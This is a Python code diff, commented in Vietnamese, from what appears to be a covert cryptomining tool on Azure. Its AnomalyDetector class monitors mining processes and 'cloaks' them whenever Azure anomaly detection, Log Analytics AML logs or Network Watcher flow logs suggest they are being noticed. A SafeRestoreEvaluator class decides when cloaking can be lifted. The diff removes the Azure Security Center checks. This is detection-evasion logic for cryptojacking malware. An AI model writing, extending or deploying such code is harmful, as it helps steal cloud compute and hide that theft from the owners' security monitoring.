@@ -133,7 +133,6 @@ class SafeRestoreEvaluator:
                 return False
 
             # 10) Kiểm tra logs từ Azure Log Analytics (dành cho AML logs nói chung)
-
             logs = self.resource_manager.azure_log_analytics_client.query_aml_logs(days=2)
             if isinstance(logs, list) and len(logs) > 0:
                 self.logger.info(
@@ -141,13 +140,7 @@ class SafeRestoreEvaluator:
                 )
                 return False
 
-            # 11) Kiểm tra khuyến nghị từ Azure Security Center
-            recommendations = self.resource_manager.azure_security_center_client.get_secure_scores()
-            if isinstance(recommendations, list) and len(recommendations) > 0:
-                self.logger.info(
-                    f"Vẫn còn {len(recommendations)} khuyến nghị bảo mật từ Azure Security Center."
-                )
-                return False
+            # (ĐÃ LƯỢC BỎ) - Phần gọi azure_security_center_client.get_secure_scores()
 
             # 12) Kiểm tra lưu lượng từ Azure Traffic Analytics
             traffic_data = self.resource_manager.azure_traffic_analytics_client.get_traffic_data()
@@ -177,10 +170,6 @@ class SafeRestoreEvaluator:
             return False
 
 class AnomalyDetector(BaseManager):
-    """
-    Lớp phát hiện bất thường, giám sát baseline và áp dụng cloaking khi cần thiết.
-    Kế thừa từ BaseManager để sử dụng các phương thức chung.
-    """
     _instance = None
     _instance_lock = Lock()
 
@@ -222,9 +211,6 @@ class AnomalyDetector(BaseManager):
         self.safe_restore_evaluator = None
 
     def set_resource_manager(self, resource_manager):
-        """
-        Thiết lập ResourceManager sau khi đã khởi tạo toàn bộ hệ thống.
-        """
         self.resource_manager = resource_manager
         self.logger.info("ResourceManager has been set for AnomalyDetector.")
 
@@ -279,7 +265,6 @@ class AnomalyDetector(BaseManager):
     def get_process_priority(self, process_name: str) -> int:
         priority_map = self.config.get('process_priority_map', {})
         priority = priority_map.get(process_name.lower(), 1)
-        # [CHANGES] Đảm bảo priority là int
         if not isinstance(priority, int):
             self.logger.warning(
                 f"Priority cho tiến trình '{process_name}' không phải int. Dùng mặc định = 1. priority={priority}"
@@ -288,9 +273,6 @@ class AnomalyDetector(BaseManager):
         return priority
 
     def anomaly_detection(self):
-        """
-        Phát hiện bất thường trong các tiến trình khai thác và thực hiện cloaking nếu cần.
-        """
         detection_interval = self.config.get("monitoring_parameters", {}).get("detection_interval_seconds", 60)
         cloak_activation_delay = self.config.get("monitoring_parameters", {}).get("cloak_activation_delay_seconds", 5)
         last_detection_time = 0
@@ -314,7 +296,6 @@ class AnomalyDetector(BaseManager):
 
                 with self.mining_processes_lock:
                     for process in self.mining_processes:
-                        # Cập nhật tài nguyên sử dụng của tiến trình
                         process.update_resource_usage()
 
                         # 1) Phát hiện bất thường qua Azure Anomaly Detector
@@ -341,7 +322,7 @@ class AnomalyDetector(BaseManager):
                             process.is_cloaked = True
                             continue
 
-                        # 3) Kiểm tra AML logs từ Azure Log Analytics (THAY ĐỔI Ở ĐÂY)
+                        # 3) Kiểm tra AML logs từ Azure Log Analytics
                         aml_logs = self.resource_manager.azure_log_analytics_client.query_aml_logs(days=2)
                         if isinstance(aml_logs, list) and len(aml_logs) > 0:
                             self.logger.warning(
@@ -351,15 +332,7 @@ class AnomalyDetector(BaseManager):
                             process.is_cloaked = True
                             continue
 
-                        # 4) Kiểm tra recommendations từ Azure Security Center
-                        recommendations = self.resource_manager.azure_security_center_client.get_secure_scores()
-                        if isinstance(recommendations, list) and len(recommendations) > 0:
-                            self.logger.warning(
-                                f"Detected {len(recommendations)} security recommendations từ Azure Security Center."
-                            )
-                            self.resource_manager.cloaking_request_queue.put(process)
-                            process.is_cloaked = True
-                            continue
+                        # (ĐÃ LƯỢC BỎ) - Phần gọi azure_security_center_client.get_secure_scores()
 
                         # 5) Kiểm tra flow logs từ Azure Network Watcher
                         for nsg in self.resource_manager.nsgs:
@@ -400,9 +373,6 @@ class AnomalyDetector(BaseManager):
             sleep(1)  # Nghỉ ngắn để tránh vòng lặp quá sát
 
     def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
-        """
-        Thu thập các chỉ số tài nguyên của tiến trình.
-        """
         try:
             proc = psutil.Process(process.pid)
             disk_io = proc.io_counters()
